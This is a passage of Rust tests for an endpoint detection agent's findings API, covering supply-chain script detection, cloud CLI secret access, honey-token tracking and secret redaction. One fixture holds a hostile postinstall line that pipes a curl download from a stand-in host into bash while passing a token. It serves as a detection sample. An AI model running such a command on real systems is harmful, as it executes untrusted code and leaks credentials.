        let req = axum::http::Request::builder()
            .method("GET")
            .uri("/api/v1/agent/health")
            .body(axum::body::Body::empty())
            .unwrap_or_else(|e| panic!("failed to build request: {e}"));
        let resp = app
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("request failed: {e}"));
        assert_eq!(resp.status(), StatusCode::UNAUTHORIZED);
    }

    #[tokio::test]
    async fn agent_health_route_reports_pending_host_state() {
        let state = Arc::new(test_state());
        let app = Router::new()
            .route("/api/v1/agent/health", get(agent_health))
            .with_state(state);

        let req = axum::http::Request::builder()
            .method("GET")
            .uri("/api/v1/agent/health")
            .header(AUTHORIZATION, "Bearer test-token")
            .body(axum::body::Body::empty())
            .unwrap_or_else(|e| panic!("failed to build request: {e}"));
        let resp = app
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("request failed: {e}"));
        assert_eq!(resp.status(), StatusCode::OK);

        let body = axum::body::to_bytes(resp.into_body(), usize::MAX)
            .await
            .unwrap_or_else(|e| panic!("failed to read response body: {e}"));
        let payload: serde_json::Value = serde_json::from_slice(&body)
            .unwrap_or_else(|e| panic!("failed to decode response body: {e}"));
        let expected_status = if cfg!(target_os = "macos") {
            "pending"
        } else {
            "ok"
        };
        assert_eq!(payload["status"], expected_status);
        assert_eq!(payload["macos_host"]["install_state"], "unknown");
        assert_eq!(payload["macos_host"]["approval"], "unknown");
        assert_eq!(
            payload["macos_host"]["endpoint_security"]["runtime"]["state"],
            "unknown"
        );
        assert_eq!(
            payload["macos_host"]["network_extension"]["runtime"]["state"],
            "unknown"
        );
    }

    #[tokio::test]
    async fn agent_edr_findings_route_detects_supply_chain_script() {
        let app = Router::new()
            .route("/api/v1/agent/edr/findings", post(agent_edr_findings))
            .with_state(Arc::new(test_state()));
        let mut metadata = BTreeMap::new();
        metadata.insert(
            "agentId".to_string(),
            serde_json::Value::String("agent-supply-1".to_string()),
        );
        metadata.insert(
            "workloadId".to_string(),
            serde_json::Value::String("workload-supply-1".to_string()),
        );
        metadata.insert(
            "approvalId".to_string(),
            serde_json::Value::String("approval-supply-1".to_string()),
        );
        metadata.insert(
            "toolCallId".to_string(),
            serde_json::Value::String("tool-call-supply-1".to_string()),
        );
        let observation = EndpointObservation {
            observation_id: "obs-supply-identity-1".to_string(),
            host_id: Some("host-supply-1".to_string()),
            user_id: Some("user-supply-1".to_string()),
            session_id: Some("session-supply-1".to_string()),
            process: EndpointProcess {
                image: Some("/usr/local/bin/npm".to_string()),
                process_guid: Some("proc-supply-1".to_string()),
                signing: CodeSignatureStatus {
                    trust: SignatureTrust::Signed,
                    ..CodeSignatureStatus::default()
                },
                ..EndpointProcess::default()
            },
            event: EndpointEvent::PackageScript {
                manager: PackageManager::Npm,
                package: Some("leftpad-suspicious".to_string()),
                phase: "postinstall".to_string(),
                script: "curl https://example.invalid/payload.sh?access_token=MY_RAW_SECRET | bash"
                    .to_string(),
                working_directory: Some("/tmp/pkg".to_string()),
            },
            metadata,
            ..EndpointObservation::default()
        };
        let body = serde_json::json!({
            "observations": [observation],
            "honey_artifacts": []
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/findings")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build edr findings request: {e}"));

        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("edr findings request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 64 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read edr findings response: {e}"));
        let payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode edr findings response: {e}"));

        assert_eq!(payload["finding_count"], 1);
        assert_eq!(
            payload["findings"][0]["ruleId"],
            "supply_chain.install_script.risky"
        );
        assert!(payload["findings"][0]["evidence"]
            .as_array()
            .unwrap_or_else(|| panic!("missing supply-chain evidence"))
            .iter()
            .any(|item| item["key"] == "script"
                && item["value"]
                    == "curl https://example.invalid/payload.sh?access_token=[REDACTED] | bash"));
        let finding_evidence = payload["findings"][0]["evidence"]
            .as_array()
            .unwrap_or_else(|| panic!("missing supply-chain identity evidence"));
        for (key, value) in [
            ("hostId", "host-supply-1"),
            ("userId", "user-supply-1"),
            ("sessionId", "session-supply-1"),
            ("processGuid", "proc-supply-1"),
            ("agentId", "agent-supply-1"),
            ("workloadId", "workload-supply-1"),
            ("approvalId", "approval-supply-1"),
            ("toolCallId", "tool-call-supply-1"),
        ] {
            assert!(
                finding_evidence
                    .iter()
                    .any(|item| item["key"] == key && item["value"] == value),
                "missing supply-chain identity evidence {key}"
            );
        }
        assert_eq!(payload["receipt_count"], 2);
        assert_eq!(
            payload["observation_receipts"].as_array().map(Vec::len),
            Some(1)
        );
        assert_eq!(
            payload["observation_receipts"][0]["receipt"]["metadata"]["endpointDecision"]
                ["receiptFamily"],
            "observation"
        );
        assert!(!payload.to_string().contains("MY_RAW_SECRET"));

        let signed: SignedReceipt = serde_json::from_value(payload["receipts"][0].clone())
            .unwrap_or_else(|e| panic!("failed to decode signed EDR receipt: {e}"));
        let endpoint_decision = signed
            .receipt
            .metadata
            .as_ref()
            .and_then(|metadata| metadata.get("endpointDecision"))
            .unwrap_or_else(|| panic!("missing endpointDecision receipt metadata"));
        let public_key = endpoint_decision
            .get("signer")
            .and_then(|signer| signer.get("signerPublicKey"))
            .and_then(serde_json::Value::as_str)
            .unwrap_or_else(|| panic!("missing endpoint receipt signer public key"));
        let public_key = hush_core::PublicKey::from_hex(public_key)
            .unwrap_or_else(|e| panic!("failed to parse receipt public key: {e}"));
        let verification = signed.verify(&hush_core::receipt::PublicKeySet::new(public_key));
        assert!(verification.valid);
        assert_eq!(
            endpoint_decision["policy"]["policyVersion"],
            serde_json::Value::String("test-edr".to_string())
        );
        assert_eq!(
            endpoint_decision["actor"]["endpointId"],
            serde_json::Value::String("test-agent".to_string())
        );
        assert_eq!(endpoint_decision["actor"]["hostId"], "host-supply-1");
        assert_eq!(endpoint_decision["actor"]["userId"], "user-supply-1");
        assert_eq!(endpoint_decision["actor"]["sessionId"], "session-supply-1");
        assert_eq!(endpoint_decision["actor"]["agentId"], "agent-supply-1");
        assert_eq!(
            endpoint_decision["actor"]["workloadId"],
            "workload-supply-1"
        );
        assert_eq!(
            endpoint_decision["actor"]["approvalId"],
            "approval-supply-1"
        );
        for (key, value) in [
            ("hostId", "host-supply-1"),
            ("userId", "user-supply-1"),
            ("sessionId", "session-supply-1"),
            ("processGuid", "proc-supply-1"),
            ("agentId", "agent-supply-1"),
            ("workloadId", "workload-supply-1"),
            ("approvalId", "approval-supply-1"),
            ("toolCallId", "tool-call-supply-1"),
        ] {
            assert!(
                receipt_evidence_hash_matches(&signed, key, value),
                "missing signed supply-chain evidence {key}"
            );
        }
    }

    #[tokio::test]
    async fn agent_edr_findings_route_detects_cloud_cli_sensitive_operation() {
        let receipt_path = test_receipt_path();
        let keypair = Keypair::from_seed(&[47u8; 32]);
        let signer_public_key = keypair.public_key().to_hex();
        let mut state = test_state();
        state.edr_receipt_ledger = Arc::new(Mutex::new(EndpointReceiptLedger {
            path: Some(receipt_path.clone()),
            next_sequence: 1,
            keypair,
            signer_identity: "test-edr-cloud-cli-signer".to_string(),
            signer_public_key,
        }));
        let app = Router::new()
            .route("/api/v1/agent/edr/findings", post(agent_edr_findings))
            .route("/api/v1/agent/edr/receipts", get(agent_edr_receipts))
            .with_state(Arc::new(state));
        let mut env = BTreeMap::new();
        env.insert("AWS_ACCESS_KEY_ID".to_string(), "AKIAEXAMPLE".to_string());
        env.insert("AWS_SECRET_ACCESS_KEY".to_string(), "secret".to_string());
        let observation = EndpointObservation {
            process: EndpointProcess {
                image: Some("/opt/homebrew/bin/aws".to_string()),
                signing: CodeSignatureStatus {
                    trust: SignatureTrust::Notarized,
                    notarized: Some(true),
                    ..CodeSignatureStatus::default()
                },
                ..EndpointProcess::default()
            },
            event: EndpointEvent::ProcessExec {
                image: "/opt/homebrew/bin/aws".to_string(),
                args: vec![
                    "secretsmanager".to_string(),
                    "get-secret-value".to_string(),
                    "--secret-id".to_string(),
                    "prod/db".to_string(),
                ],
                env,
            },
            ..EndpointObservation::default()
        };
        let body = serde_json::json!({
            "observations": [observation],
            "honey_artifacts": []
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/findings")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build cloud CLI EDR findings request: {e}"));

        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("cloud CLI EDR findings request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read cloud CLI EDR findings response: {e}"));
        let payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode cloud CLI EDR findings response: {e}"));

        assert_eq!(payload["finding_count"], 1);
        assert_eq!(
            payload["findings"][0]["ruleId"],
            "supply_chain.cloud_cli_sensitive_operation"
        );
        assert_eq!(payload["receipt_count"], 2);
        assert_eq!(
            payload["observation_receipts"].as_array().map(Vec::len),
            Some(1)
        );
        assert!(payload["findings"][0]["evidence"]
            .as_array()
            .unwrap_or_else(|| panic!("missing cloud CLI evidence"))
            .iter()
            .any(|item| item["key"] == "credentialEnvKeys"
                && item["value"]
                    .as_str()
                    .is_some_and(|value| value.contains("AWS_ACCESS_KEY_ID"))));

        let finding_id = payload["findings"][0]["findingId"]
            .as_str()
            .unwrap_or_else(|| panic!("missing cloud CLI finding id"));
        let req = axum::http::Request::builder()
            .method("GET")
            .uri(format!(
                "/api/v1/agent/edr/receipts?family=detection&ruleId=supply_chain.cloud_cli_sensitive_operation&findingId={finding_id}&limit=10"
            ))
            .header(AUTHORIZATION, "Bearer test-token")
            .body(axum::body::Body::empty())
            .unwrap_or_else(|e| panic!("failed to build cloud CLI receipt query: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("cloud CLI receipt query failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read cloud CLI receipt query response: {e}"));
        let payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode cloud CLI receipt query response: {e}"));
        assert_eq!(payload["receipt_count"], 1);
        assert_eq!(
            payload["receipts"][0]["receipt"]["metadata"]["endpointDecision"]["decision"]["ruleId"],
            "supply_chain.cloud_cli_sensitive_operation"
        );

        let _ = std::fs::remove_file(receipt_path);
    }

    #[tokio::test]
    async fn agent_edr_findings_redacts_file_content_preview_before_recording() {
        let flight_recorder_path = test_flight_recorder_path();
        let _ = std::fs::remove_file(&flight_recorder_path);
        let mut state = test_state();
        state.edr_flight_recorder = Arc::new(Mutex::new(
            EndpointFlightRecorder::open(&flight_recorder_path)
                .unwrap_or_else(|e| panic!("failed to open test flight recorder: {e}")),
        ));
        let app = Router::new()
            .route("/api/v1/agent/edr/findings", post(agent_edr_findings))
            .with_state(Arc::new(state));
        let observation = EndpointObservation {
            process: EndpointProcess {
                process_guid: Some("proc-file-preview-redaction-1".to_string()),
                image: Some("/usr/bin/python3".to_string()),
                ..EndpointProcess::default()
            },
            event: EndpointEvent::FileAccess {
                operation: FileOperation::Read,
                path: "/Users/alice/work/customer-secret.txt".to_string(),
                source_url: None,
                content_preview: Some("MY_RAW_SECRET customer content".to_string()),
            },
            ..EndpointObservation::default()
        };
        let body = serde_json::json!({
            "observations": [observation],
            "honey_artifacts": []
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/findings")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build file-preview findings request: {e}"));

        let response = app
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("file-preview findings request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let recorded = std::fs::read_to_string(&flight_recorder_path)
            .unwrap_or_else(|e| panic!("failed to read flight recorder: {e}"));
        assert!(!recorded.contains("MY_RAW_SECRET"));
        let stored = recorded
            .lines()
            .find(|line| !line.trim().is_empty())
            .and_then(|line| serde_json::from_str::<EndpointObservation>(line).ok())
            .unwrap_or_else(|| panic!("missing stored endpoint observation"));
        let EndpointEvent::FileAccess {
            content_preview, ..
        } = stored.event
        else {
            panic!("stored observation should remain file_access");
        };
        assert_eq!(content_preview.as_deref(), Some("[REDACTED]"));

        let _ = std::fs::remove_file(flight_recorder_path);
    }

    #[tokio::test]
    async fn agent_edr_findings_redacts_secret_access_key_env_before_recording() {
        let flight_recorder_path = test_flight_recorder_path();
        let _ = std::fs::remove_file(&flight_recorder_path);
        let mut state = test_state();
        state.edr_flight_recorder = Arc::new(Mutex::new(
            EndpointFlightRecorder::open(&flight_recorder_path)
                .unwrap_or_else(|e| panic!("failed to open test flight recorder: {e}")),
        ));
        let app = Router::new()
            .route("/api/v1/agent/edr/findings", post(agent_edr_findings))
            .with_state(Arc::new(state));
        let mut env = BTreeMap::new();
        env.insert(
            "AWS_SECRET_ACCESS_KEY".to_string(),
            "MY_RAW_SECRET".to_string(),
        );
        let observation = EndpointObservation {
            process: EndpointProcess {
                process_guid: Some("proc-secret-access-key-env-redaction-1".to_string()),
                image: Some("/usr/bin/aws".to_string()),
                ..EndpointProcess::default()
            },
            event: EndpointEvent::ProcessExec {
                image: "/usr/bin/aws".to_string(),
                args: vec![
                    "secretsmanager".to_string(),
                    "get-secret-value".to_string(),
                    "--secret-id".to_string(),
                    "prod/db".to_string(),
                ],
                env,
            },
            ..EndpointObservation::default()
        };
        let body = serde_json::json!({
            "observations": [observation],
            "honey_artifacts": []
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/findings")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build env-redaction findings request: {e}"));

        let response = app
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("env-redaction findings request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let recorded = std::fs::read_to_string(&flight_recorder_path)
            .unwrap_or_else(|e| panic!("failed to read flight recorder: {e}"));
        assert!(!recorded.contains("MY_RAW_SECRET"));
        let stored = recorded
            .lines()
            .find(|line| !line.trim().is_empty())
            .and_then(|line| serde_json::from_str::<EndpointObservation>(line).ok())
            .unwrap_or_else(|| panic!("missing stored endpoint observation"));
        let EndpointEvent::ProcessExec { args, env, .. } = stored.event else {
            panic!("stored observation should remain process_exec");
        };
        assert_eq!(args[2], "--secret-id");
        assert_eq!(args[3], "prod/db");
        assert_eq!(
            env.get("AWS_SECRET_ACCESS_KEY").map(String::as_str),
            Some("[REDACTED]")
        );

        let _ = std::fs::remove_file(flight_recorder_path);
    }

    #[tokio::test]
    async fn agent_edr_findings_redacts_sensitive_query_param_after_safe_param_before_recording() {
        let flight_recorder_path = test_flight_recorder_path();
        let _ = std::fs::remove_file(&flight_recorder_path);
        let mut state = test_state();
        state.edr_flight_recorder = Arc::new(Mutex::new(
            EndpointFlightRecorder::open(&flight_recorder_path)
                .unwrap_or_else(|e| panic!("failed to open test flight recorder: {e}")),
        ));
        let app = Router::new()
            .route("/api/v1/agent/edr/findings", post(agent_edr_findings))
            .with_state(Arc::new(state));
        let raw_url =
            "https://api.example.invalid/download?file=setup.sh&token=MY_RAW_SECRET&mode=install";
        let redacted_url =
            "https://api.example.invalid/download?file=setup.sh&token=[REDACTED]&mode=install";
        let redacted_command_line = format!("curl {redacted_url}");
        let observation = EndpointObservation {
            process: EndpointProcess {
                process_guid: Some("proc-query-redaction-1".to_string()),
                image: Some("/usr/bin/curl".to_string()),
                command_line: Some(format!("curl {raw_url}")),
                ..EndpointProcess::default()
            },
            event: EndpointEvent::NetworkFlow {
                host: "api.example.invalid".to_string(),
                port: 443,
                protocol: Some("https".to_string()),
                url: Some(raw_url.to_string()),
            },
            ..EndpointObservation::default()
        };
        let body = serde_json::json!({
            "observations": [observation],
            "honey_artifacts": []
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/findings")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build query-param findings request: {e}"));

        let response = app
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("query-param findings request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let recorded = std::fs::read_to_string(&flight_recorder_path)
            .unwrap_or_else(|e| panic!("failed to read flight recorder: {e}"));
        assert!(!recorded.contains("MY_RAW_SECRET"));
        let stored = recorded
            .lines()
            .find(|line| !line.trim().is_empty())
            .and_then(|line| serde_json::from_str::<EndpointObservation>(line).ok())
            .unwrap_or_else(|| panic!("missing stored endpoint observation"));
        assert_eq!(
            stored.process.command_line.as_deref(),
            Some(redacted_command_line.as_str())
        );
        let EndpointEvent::NetworkFlow { url, .. } = stored.event else {
            panic!("stored observation should remain network_flow");
        };
        assert_eq!(url.as_deref(), Some(redacted_url));

        let _ = std::fs::remove_file(flight_recorder_path);
    }

    #[tokio::test]
    async fn agent_edr_findings_redacts_access_token_query_param_before_recording() {
        let flight_recorder_path = test_flight_recorder_path();
        let _ = std::fs::remove_file(&flight_recorder_path);
        let mut state = test_state();
        state.edr_flight_recorder = Arc::new(Mutex::new(
            EndpointFlightRecorder::open(&flight_recorder_path)
                .unwrap_or_else(|e| panic!("failed to open test flight recorder: {e}")),
        ));
        let app = Router::new()
            .route("/api/v1/agent/edr/findings", post(agent_edr_findings))
            .with_state(Arc::new(state));
        let raw_url =
            "https://api.example.invalid/oauth/callback?state=ok&access_token=MY_RAW_SECRET";
        let redacted_url =
            "https://api.example.invalid/oauth/callback?state=ok&access_token=[REDACTED]";
        let redacted_command_line = format!("curl {redacted_url}");
        let observation = EndpointObservation {
            process: EndpointProcess {
                process_guid: Some("proc-access-token-query-redaction-1".to_string()),
                image: Some("/usr/bin/curl".to_string()),
                command_line: Some(format!("curl {raw_url}")),
                ..EndpointProcess::default()
            },
            event: EndpointEvent::NetworkFlow {
                host: "api.example.invalid".to_string(),
                port: 443,
                protocol: Some("https".to_string()),
                url: Some(raw_url.to_string()),
            },
            ..EndpointObservation::default()
        };
        let body = serde_json::json!({
            "observations": [observation],
            "honey_artifacts": []
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/findings")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build access-token findings request: {e}"));

        let response = app
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("access-token findings request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let recorded = std::fs::read_to_string(&flight_recorder_path)
            .unwrap_or_else(|e| panic!("failed to read flight recorder: {e}"));
        assert!(!recorded.contains("MY_RAW_SECRET"));
        let stored = recorded
            .lines()
            .find(|line| !line.trim().is_empty())
            .and_then(|line| serde_json::from_str::<EndpointObservation>(line).ok())
            .unwrap_or_else(|| panic!("missing stored endpoint observation"));
        assert_eq!(
            stored.process.command_line.as_deref(),
            Some(redacted_command_line.as_str())
        );
        let EndpointEvent::NetworkFlow { url, .. } = stored.event else {
            panic!("stored observation should remain network_flow");
        };
        assert_eq!(url.as_deref(), Some(redacted_url));

        let _ = std::fs::remove_file(flight_recorder_path);
    }

    #[tokio::test]
    async fn agent_edr_findings_redacts_url_userinfo_password_before_recording() {
        let flight_recorder_path = test_flight_recorder_path();
        let _ = std::fs::remove_file(&flight_recorder_path);
        let mut state = test_state();
        state.edr_flight_recorder = Arc::new(Mutex::new(
            EndpointFlightRecorder::open(&flight_recorder_path)
                .unwrap_or_else(|e| panic!("failed to open test flight recorder: {e}")),
        ));
        let app = Router::new()
            .route("/api/v1/agent/edr/findings", post(agent_edr_findings))
            .with_state(Arc::new(state));
        let raw_url = "https://deploy:MY_RAW_SECRET@api.example.invalid/releases/latest";
        let redacted_url = "https://deploy:[REDACTED]@api.example.invalid/releases/latest";
        let redacted_command_line = format!("curl {redacted_url}");
        let observation = EndpointObservation {
            process: EndpointProcess {
                process_guid: Some("proc-url-userinfo-redaction-1".to_string()),
                image: Some("/usr/bin/curl".to_string()),
                command_line: Some(format!("curl {raw_url}")),
                ..EndpointProcess::default()
            },
            event: EndpointEvent::NetworkFlow {
                host: "api.example.invalid".to_string(),
                port: 443,
                protocol: Some("https".to_string()),
                url: Some(raw_url.to_string()),
            },
            ..EndpointObservation::default()
        };
        let body = serde_json::json!({
            "observations": [observation],
            "honey_artifacts": []
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/findings")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build url-userinfo findings request: {e}"));

        let response = app
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("url-userinfo findings request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let recorded = std::fs::read_to_string(&flight_recorder_path)
            .unwrap_or_else(|e| panic!("failed to read flight recorder: {e}"));
        assert!(!recorded.contains("MY_RAW_SECRET"));
        let stored = recorded
            .lines()
            .find(|line| !line.trim().is_empty())
            .and_then(|line| serde_json::from_str::<EndpointObservation>(line).ok())
            .unwrap_or_else(|| panic!("missing stored endpoint observation"));
        assert_eq!(
            stored.process.command_line.as_deref(),
            Some(redacted_command_line.as_str())
        );
        let EndpointEvent::NetworkFlow { url, .. } = stored.event else {
            panic!("stored observation should remain network_flow");
        };
        assert_eq!(url.as_deref(), Some(redacted_url));

        let _ = std::fs::remove_file(flight_recorder_path);
    }

    #[tokio::test]
    async fn agent_edr_findings_redacts_url_userinfo_token_before_recording() {
        let flight_recorder_path = test_flight_recorder_path();
        let _ = std::fs::remove_file(&flight_recorder_path);
        let mut state = test_state();
        state.edr_flight_recorder = Arc::new(Mutex::new(
            EndpointFlightRecorder::open(&flight_recorder_path)
                .unwrap_or_else(|e| panic!("failed to open test flight recorder: {e}")),
        ));
        let app = Router::new()
            .route("/api/v1/agent/edr/findings", post(agent_edr_findings))
            .with_state(Arc::new(state));
        let raw_url = "https://MY_RAW_SECRET@api.example.invalid/releases/latest";
        let redacted_url = "https://[REDACTED]@api.example.invalid/releases/latest";
        let redacted_command_line = format!("curl {redacted_url}");
        let observation = EndpointObservation {
            process: EndpointProcess {
                process_guid: Some("proc-url-userinfo-token-redaction-1".to_string()),
                image: Some("/usr/bin/curl".to_string()),
                command_line: Some(format!("curl {raw_url}")),
                ..EndpointProcess::default()
            },
            event: EndpointEvent::NetworkFlow {
                host: "api.example.invalid".to_string(),
                port: 443,
                protocol: Some("https".to_string()),
                url: Some(raw_url.to_string()),
            },
            ..EndpointObservation::default()
        };
        let body = serde_json::json!({
            "observations": [observation],
            "honey_artifacts": []
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/findings")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build url-userinfo-token findings request: {e}"));

        let response = app
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("url-userinfo-token findings request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let recorded = std::fs::read_to_string(&flight_recorder_path)
            .unwrap_or_else(|e| panic!("failed to read flight recorder: {e}"));
        assert!(!recorded.contains("MY_RAW_SECRET"));
        let stored = recorded
            .lines()
            .find(|line| !line.trim().is_empty())
            .and_then(|line| serde_json::from_str::<EndpointObservation>(line).ok())
            .unwrap_or_else(|| panic!("missing stored endpoint observation"));
        assert_eq!(
            stored.process.command_line.as_deref(),
            Some(redacted_command_line.as_str())
        );
        let EndpointEvent::NetworkFlow { url, .. } = stored.event else {
            panic!("stored observation should remain network_flow");
        };
        assert_eq!(url.as_deref(), Some(redacted_url));

        let _ = std::fs::remove_file(flight_recorder_path);
    }

    #[tokio::test]
    async fn agent_edr_findings_preserves_content_preview_honey_detection_without_recording_preview(
    ) {
        let flight_recorder_path = test_flight_recorder_path();
        let _ = std::fs::remove_file(&flight_recorder_path);
        let artifact = HoneyArtifact {
            artifact_id: "honey-content-preview-1".to_string(),
            kind: HoneyArtifactKind::ApiTokenFile,
            relative_path: PathBuf::from(".clawdstrike/honey.env"),
            marker: "clawdstrike-honey-content-preview-marker".to_string(),
            contents:
                "CLAWDSTRIKE_PROD_API_TOKEN=cs_live_clawdstrike-honey-content-preview-marker\n"
                    .to_string(),
            permissions_octal: 0o600,
            tags: vec!["deception".to_string(), "endpoint".to_string()],
        };
        let mut state = test_state();
        state.edr_flight_recorder = Arc::new(Mutex::new(
            EndpointFlightRecorder::open(&flight_recorder_path)
                .unwrap_or_else(|e| panic!("failed to open test flight recorder: {e}")),
        ));
        {
            let mut registry = state.edr_honey_registry.lock().await;
            registry
                .register(std::slice::from_ref(&artifact))
                .unwrap_or_else(|e| panic!("failed to register honey artifact: {e}"));
        }
        let app = Router::new()
            .route("/api/v1/agent/edr/findings", post(agent_edr_findings))
            .with_state(Arc::new(state));
        let observation = EndpointObservation {
            process: EndpointProcess {
                process_guid: Some("proc-file-preview-honey-1".to_string()),
                image: Some("/usr/bin/python3".to_string()),
                ..EndpointProcess::default()
            },
            event: EndpointEvent::FileAccess {
                operation: FileOperation::Read,
                path: "/tmp/unrelated-preview.txt".to_string(),
                source_url: None,
                content_preview: Some(format!("user copied {} into another file", artifact.marker)),
            },
            ..EndpointObservation::default()
        };
        let body = serde_json::json!({
            "observations": [observation],
            "honey_artifacts": []
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/findings")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build content-preview honey request: {e}"));

        let response = app
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("content-preview honey request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read content-preview honey response: {e}"));
        let payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode content-preview honey response: {e}"));
        assert_eq!(payload["finding_count"], 1);
        assert_eq!(
            payload["findings"][0]["ruleId"],
            "deception.honey_artifact_touched"
        );
        assert!(payload["findings"][0]["evidence"]
            .as_array()
            .unwrap_or_else(|| panic!("missing content-preview honey evidence"))
            .iter()
            .any(|item| item["key"] == "matchType" && item["value"] == "marker"));

        let recorded = std::fs::read_to_string(&flight_recorder_path)
            .unwrap_or_else(|e| panic!("failed to read flight recorder: {e}"));
        assert!(!recorded.contains("clawdstrike-honey-content-preview-marker"));
        let stored = recorded
            .lines()
            .find(|line| !line.trim().is_empty())
            .and_then(|line| serde_json::from_str::<EndpointObservation>(line).ok())
            .unwrap_or_else(|| panic!("missing stored endpoint observation"));
        let EndpointEvent::FileAccess {
            content_preview, ..
        } = stored.event
        else {
            panic!("stored observation should remain file_access");
        };
        assert_eq!(content_preview.as_deref(), Some("[REDACTED]"));

        let _ = std::fs::remove_file(flight_recorder_path);
    }

    #[tokio::test]
    async fn agent_edr_findings_rejects_unregistered_submitted_honey_artifacts() {
        let state = test_state();
        let app = Router::new()
            .route("/api/v1/agent/edr/findings", post(agent_edr_findings))
            .with_state(Arc::new(state));
        let artifact = HoneyArtifact {
            artifact_id: "forged-honey-content-preview-1".to_string(),
            kind: HoneyArtifactKind::ApiTokenFile,
            relative_path: PathBuf::from(".clawdstrike/forged-honey.env"),
            marker: "clawdstrike-forged-honey-marker".to_string(),
            contents: "CLAWDSTRIKE_PROD_API_TOKEN=cs_live_forged_honey_marker\n".to_string(),
            permissions_octal: 0o600,
            tags: vec!["deception".to_string(), "endpoint".to_string()],
        };
        let observation = EndpointObservation {
            process: EndpointProcess {
                process_guid: Some("proc-forged-honey-1".to_string()),
                image: Some("/usr/bin/python3".to_string()),
                ..EndpointProcess::default()
            },
            event: EndpointEvent::FileAccess {
                operation: FileOperation::Read,
                path: "/tmp/unrelated-forged-honey.txt".to_string(),
                source_url: None,
                content_preview: Some(format!("caller planted {}", artifact.marker)),
            },
            ..EndpointObservation::default()
        };
        let body = serde_json::json!({
            "observations": [observation],
            "honey_artifacts": [artifact]
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/findings")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build forged honey request: {e}"));

        let response = app
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("forged honey request failed: {e}"));
        assert_eq!(response.status(), StatusCode::BAD_REQUEST);
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
